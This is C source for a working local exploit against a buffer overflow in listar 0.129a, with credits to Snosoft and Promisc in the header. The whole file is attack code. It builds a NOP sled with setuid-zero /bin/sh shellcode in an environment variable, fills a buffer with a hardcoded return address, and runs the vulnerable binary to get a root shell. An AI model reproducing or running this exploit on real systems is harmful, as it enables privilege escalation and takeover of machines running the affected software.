/*
 * /home/listar-0.129a/listar
 *
 * The vulnerability was found by KF / Snosoft (http://www.snosoft.com)
 * Exploit coded up by The Itch / Promisc (http://www.promisc.org)
 *
 * This exploit was developed on the Snosoft vulnerability research machines
 *
 * - The Itch
 * - itchie@promisc.org
 *
 * - Technical details concerning the exploit -
 *
 * 1) Buffer overflow occurs after writing 990 bytes into the buffer at the command line
 *    (990 to overwrite ebp, 996 to overwrite eip).
 * 2) The code string with the return address will be unaligned.
 *
 */

#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 1000

char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
        char *buff;
        char *egg;
        char *ptr;
        long *addr_ptr;
        long addr;
        int bsize = DEFAULT_BUFFER_SIZE;
        int eggsize = DEFAULT_EGG_SIZE;
        int i;
        int get_sp = 0xbffff4e0;

        if(argc > 1) { bsize = atoi(argv[1]); }

        if(!(buff = malloc(bsize)))
        {
                printf("unable to allocate memory for %d bytes\n", bsize);
                exit(1);
        }

        if(!(egg = malloc(eggsize)))
        {
                printf("unable to allocate memory for %d bytes\n", eggsize);
                exit(1);
        }

        printf("/home/listar-0.129a/listar\n");
        printf("Vulnerability found by KF / http://www.snosoft.com\n");
        printf("Coded by The Itch / http://www.promisc.org\n\n");
        printf("Using return address: 0x%x\n", get_sp);
        printf("Using buffersize    : %d\n", bsize);

        /* alignment */
        ptr = buff + 2;

        addr_ptr = (long *) ptr;
        for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = get_sp; }

        ptr = egg;
        for(i = 0; i < eggsize - strlen(shellcode) -1; i++)
        {
                *(ptr++) = NOP;
        }

        for(i = 0; i < strlen(shellcode); i++)
        {
                *(ptr++) = shellcode[i];
        }

        egg[eggsize - 1] = '\0';
        buff[bsize -1] = '\0';
        memcpy(buff, "RET=", 4);
        memcpy(egg, "EGG=", 4);
        putenv(buff);
        putenv(egg);
        system("/home/listar-0.129a/listar $RET");

        return 0;
}